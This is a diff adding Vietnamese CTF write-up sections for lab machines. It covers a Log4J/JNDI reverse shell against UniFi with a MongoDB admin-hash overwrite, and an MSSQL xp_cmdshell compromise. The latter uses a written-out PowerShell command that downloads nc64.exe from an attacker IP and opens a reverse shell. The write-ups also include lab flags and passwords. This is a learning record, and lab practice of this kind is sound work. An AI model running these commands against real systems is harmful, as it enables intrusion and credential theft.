@@ -232,13 +232,62 @@ Trong cơ sở dữ liệu MongoDB của UniFi, thông tin người dùng quản
 Trong cơ sở dữ liệu MongoDB của UniFi, thông tin người dùng được lưu trong collection admin. Vì vậy, để cập nhật thông tin của một user, hàm được sử dụng là db.admin.update(). Hàm update() cho phép tìm document theo điều kiện và sửa các trường tương ứng trong document đó.
 > db.admin.update()
 
-### Task 12
+### Task 12: What is the function we use to update users within the database in MongoDB?
 
 - Từ dữ kiện của các task trước:
   - Web dùng `UniFi Network` version `6.4.54` và bị lỗ hổng `Log4J`
   - Có thể tên database mặc định là ace
   - Có thể liệt kê các document trong collection bằng lệnh `db.admin.find()`
 
+### Task 13: What is the password for the root user?
+
+- Từ những task trước ta đã biết hệ thống dính lỗ hổng `Log4J`
+- Web này hơi đặc biệt là mở cổng `8443` để kết nối
+- Trên máy cá nhân dùng `nc` để mở port lắng nghe:
+![1774370210635](image/Report/1774370210635.png)
+- Sau khi xác định được điểm chèn là tham số `remember`, thì tạo một reverse shell:
+  - Dùng burp suite bắt lại gói tin đăng nhập để chèn lệnh:
+![1774373753808](image/Report/1774373753808.png)
+  - Khởi tạo LDAP Server giả lập: Sử dụng công cụ Rogue-JNDI để dựng máy chủ LDAP nhằm cung cấp mã độc cho hệ thống mục tiêu qua giao thức JNDI:
+![1774373803342](image/Report/1774373803342.png)
+
+> Sau khi nhấn Send trên burp suite, hệ thống mục tiêu kết nối ngược về máy cá nhân và trả về một shell tại cửa sổ netcat đang lắng nghe
+
+- Sau khi có shell dùng `mongo` để kết nối vào database `ace`
+  - Lệnh liệt kê người dùng: `db.admin.find().forEach(printjson);`
+  - Phát hiện tài khoản quản trị viên có `id: ObjectId("61ce278f46e0fb0012d47ee4")`
+![1774373984558](image/Report/1774373984558.png)
+- Cập nhật mã băm SHA-512 mới của mật khẩu là `tuananh`:
+![1774374080649](image/Report/1774374080649.png)
+
+> Hệ thống phản hồi nModified: 1, xác nhận thay đổi thành công
+
+- Đăng nhập vàovàowweb với tài khoản `administrator : tuananh`
+- Tìm thấy password ở `SSH Authentication`, ở đây password hiện ở dạng plaintext:
+![1774374259727](image/Report/1774374259727.png)
+
+> NotACrackablePassword4U2022
+
+### User flag?
+
+- Hiện tại shell ta đang chiếm quyền là của 1 user nên chỉ cần chuyển vào thư mục home để lấy flag:
+![1774374447505](image/Report/1774374447505.png)
+
+> 6ced1a6a89e666c0620cdb10262ba127
+
+### Root flag?
+
+- Đã thu được tài khoản ssh của root ở task 13 nên giờ chỉ việc đăng nhập vào và lấy flag:
+![1774374779274](image/Report/1774374779274.png)
+
+> e50bc93c75b634e4b272d2f771c33681
+
+### Tổng kết kết quả
+
+![1774374867931](image/Report/1774374867931.png)
+![1774374879579](image/Report/1774374879579.png)
+![1774374891841](image/Report/1774374891841.png)
+![1774374908561](image/Report/1774374908561.png)
 ---
 
 ## 3. Oopside
@@ -437,12 +486,105 @@ export PATH=/tmp:$PATH
 
 ### Task 1: Which TCP port is hosting a database server?
 
-- Link tham khảo: <https://www.mssqltips.com/sqlservertip/2495/identify-sql-server-tcp-ip-port-being-used/>
+- Dùng nmap để scan các port đang mở:
+![1774360053404](image/Report/1774360053404.png)
 
 > 1433
 
-### Task 2
+### Task 2: What is the name of the non-Administrative share available over SMB?
 
+- Từ kết quả scan nmap của task 1 ta đã biết cổng `445/tcp` đang mở, đây là cổng chạy dịch vụ
+microsoft-ds (SMB)
+- Phần gợi ý của task này có hướng dẫn sau khi biết SMB đang chạy thì dùng lệnh `smbclient -N -L \\\\{TARGET_IP}\\` để scan những thư mục trên máy chủ đó:
+![1774360460348](image/Report/1774360460348.png)
+![1774360653569](image/Report/1774360653569.png)
+
+> backups
+
+### Task 3: What is the password identified in the file on the SMB share?
+
+- Phần gợi ý của task này gợi ý dùng công cụ `smbclient` để truy cập trực tiếp vào share `backups` mà không cần mật khẩu (sử dụng flag -N)
+- Sau khi kết nói được thì tìm thử chỉ thấy file `prog.dtsConfig` là khả nghi, dùng lệnh `get` để tải về:
+![1774361093892](image/Report/1774361093892.png)
+- Ở file này đã tìm được kết quả:
+![1774361134228](image/Report/1774361134228.png)
+
+> M3g4c0rp123
+
+### Task 4: What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
+
+![1774361244108](image/Report/1774361244108.png)
+> mssqlclient.py
+
+### Task 5: What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
+
+> xp_cmdshell
+
+### Task 6: What script can be used in order to search possible paths to escalate privileges on Windows hosts?
+
+![1774361916535](image/Report/1774361916535.png)
+> winPEAS
+
+### Task 7: What file contains the administrator's password?
+
+- Ở task 3 ta đã tìm được thông tin đăng nhập:
+  - User: `ARCHETYPE\sql_svc`
+  - Password: `M3g4c0rp123`
+- Dùng thông tin này để kết nối vào cơ sở dữ liệu và nhập mật khẩu (Ở task 4 đã gợi ý dùng mssqlclient.py)
+- Kiểm tra quyền admin:
+![1774363765678](image/Report/1774363765678.png)
+
+> User này có quyền admin
+
+- Mở `xp_cmdshell` để có thể dùng các lệnh windows tạo bước đệm để reverse shell:
+![1774363960252](image/Report/1774363960252.png)
+- Trên máy cá nhân mở một terminal mới, chạy server HTTP: `sudo python3 -m http.server 80`
+- Mở một terminal khác, lắng nghe kết nối: `nc -lvnp 443`
+- Sau đó tiến hành tải nc64.exe về máy mục tiêu: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.105/nc64.exe -outfile nc64.exe"`
+- Kích hoạt shell: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.105 443"`
+![1774364342107](image/Report/1774364342107.png)
+
+> Đã chiếm được shell
+
+- Sau một lúc khám phá thì tìm được `user flag`:
+![1774364526140](image/Report/1774364526140.png)
+
+> 3e7b102e78218e935bf3f4951fec21a3
+
+- Ở phần gợi ý task này có gợi ý dùng `Winpeas`, tận dụng server đang mở tại máy nên ta tải lên server mục tiêu luôn và chạy `.\winPEASx64.exe`:
+![1774366407449](image/Report/1774366407449.png)
+
+> Hệ thống đã tìm thấy một file lưu lại lịch sử các lệnh đã gõ.
+
+- Mở tệp `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`:
+![1774366544462](image/Report/1774366544462.png)
+- Mật khẩu quản trị viên: `MEGACORP_4dm1n!!`
+
+> Đáp án task này là **ConsoleHost_history.txt** vì đã tìm thấy mật khẩu của quản trị viên
+
+### User flag?
+
+- Đã tìm được ở task 7
+
+> 3e7b102e78218e935bf3f4951fec21a3
+
+### Root flag?
+
+- Thu được password của admin thì cứ kết nối vào là được
+![1774367055357](image/Report/1774367055357.png)
+
+> Đã đăng nhập được tài khoản admin
+
+- Giờ chỉ việc đi tìm flag:
+![1774367252707](image/Report/1774367252707.png)
+
+> b91ccec3305e98240082d4474b848528
+
+### Tổng kết kết quả
+
+![1774367316546](image/Report/1774367316546.png)
+![1774367328329](image/Report/1774367328329.png)
+![1774367362005](image/Report/1774367362005.png)
 ---
 
 ## 5. Markup
